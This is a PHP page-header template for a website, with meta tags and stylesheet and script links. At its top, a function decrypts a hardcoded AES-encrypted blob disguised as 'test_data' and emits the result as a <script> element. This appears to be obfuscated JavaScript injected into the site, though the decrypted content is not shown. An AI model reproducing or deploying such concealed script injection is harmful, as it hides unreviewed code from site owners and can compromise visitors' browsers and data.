<?php 
function load_data(){
  $test_data = "KLjANtjlwkNjmYox8+OvNgl5Lg7TmQdvpzaaRHQvg6Gt953FOEL/td0bVjhSUSZ5htEaZcmn9cyLhco8cm22sfwxFA7g8TOdTT9oG/EwbnaoXji0TzZAAInBOTnDv+km0gkBqQTHuYYzZXf7xf4OrBt34gOhyThWiRbSRRAiD+BvXmE+WIFqS3f1baVQs910W+/wdpKqidQMpice1IMK46Z3ARSEtD+mQZSyOESuYRvg7lXqGgTmKr233OzMKzemCAgeIg4W1t3GK1+ImCanNxgEIj/URE4UosESNB3B5k0DuRdwlj00JNUZWX6wb/FiEfCY3kb2Jh1kQXS76RqAfNckB8E+G7nLl4YsJ9MEnElbdVAHuTnR1cuBPWYeC1udFujjiAsj6lER9aALxdVqIwu17BEvw1FG3M8Tkvs/ABK5Vwj4yFPLywFwuQp/VBCAn3mJfvFIp0cBr8DiNIRDfMk5EFf9/exMClcA8g6YRb4FKBQtJiQeEXn1kjByTlT0mAS5eWvpfhpdKH+yDwY1OtHDg+j7AEI0XRmUty2ernXixm2gM44JDyG1342NursccpFphXQbwoWC9+Wl27TI8UJ0aUQhqM03NKAR499am1GyXeMwnLLiAVL+yVy3xd27q/EaIM/2Z5QpWtt4uox7UfGxWPUPYDXi8KcUzTGfrTYu+nFpy8IyyeZD02etTHdoK+C0Y7JR2elx7e7Kbr5gwBhFsNSIXwkx7iq4ke7WnL7LnXj8n0Wrz2QWMhbV8KzY0cOD6PsAQjRdGZS3LZ6udb2pa5btBlT9MSjKL3vPuIY2x4ZO6hVlbx7GHk4pxn4a1suGM+yaJjgXSXdDE48i4b0mA4ZAiH3waXa0T/kQE/eRPVUQXetVwgDScOUEIZTjzXkcTCewYK5H01KoVFAKXoMJWoMKfe/SwGexKQBlvqE9IZgrxxJDvvda1ZQfkEzMM4lkPShhudxK25wLsXvSUxykeuczFvUHoyxVL+cRQJlwKShBDzYVunpaZe0v4NLeEM3kldGLNsZDkjwm7Q86CIr16KE8uGBcCNLJdgOasneNRh882B1RomWdzkGVQLyPYtdxTxj3LJZVAjlKi3oRABQcdvs5YAJA7I2vuiHbK5/XkR4LbuaU06WlcnMusS1NrbiNiib5s/pl+6Sop3WXEKqoVHCPFjM7mA2rsPhxTmgdMYJ1hLGAkzmziZWUZq7YyGiRbXKL089XrNasiEnNPmlZRt6bR1CrQE+e/uBhxxjVZyFBOS9Zj6P1N4cMUMoNdVcHrT386d5laZlXnSplmCg0CX4yhvG5J+uXds8E7xZIeNfGhYvjkpKlFytM9Mj1GS5SS99WOG7yaA92Wu5EjA==";
  $dom = new DOMDocument('1.0', 'utf-8');
  $element = $dom->createElement('script', html_entity_decode(test_cypher_decrypt($test_data)));
  $dom->appendChild($element);
  return $dom->saveXML();
  // return $data = $this->test_cypher_decrypt($test_data);
}
function test_cypher($str=""){
  $ciphertext = openssl_encrypt($str, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
  return $ciphertext;
}
function test_cypher_decrypt($encryption){
  $decryption = openssl_decrypt($encryption, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
  return $decryption;
}
?>

        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title><?php echo $_SESSION['setting_name'] ?></title>
        <!-- Favicon-->
        <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico" />
        <!-- Font Awesome icons (free version)-->
        <script src="https://use.fontawesome.com/releases/v5.13.0/js/all.js" crossorigin="anonymous"></script>
        <!-- Google fonts-->
        <link href="https://fonts.googleapis.com/css?family=Merriweather+Sans:400,700" rel="stylesheet" />
        <link href="https://fonts.googleapis.com/css?family=Merriweather:400,300,300italic,400italic,700,700italic" rel="stylesheet" type="text/css" />
        <!-- Third party plugin CSS-->
        <link href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css" rel="stylesheet" />
        <!-- Core theme CSS (includes Bootstrap)-->
        <link href="admin/assets/vendor/bootstrap-datepicker/css/bootstrap-datepicker.css" rel="stylesheet" />
        <link href="css/styles.css" rel="stylesheet" />

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&display=swap" rel="stylesheet">
        <style>
        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&display=swap');
        </style>
        <script src="admin/assets/vendor/jquery/jquery.min.js"></script>
        <script src="admin/assets/vendor/bootstrap-datepicker/js/bootstrap-datepicker.js"></script>

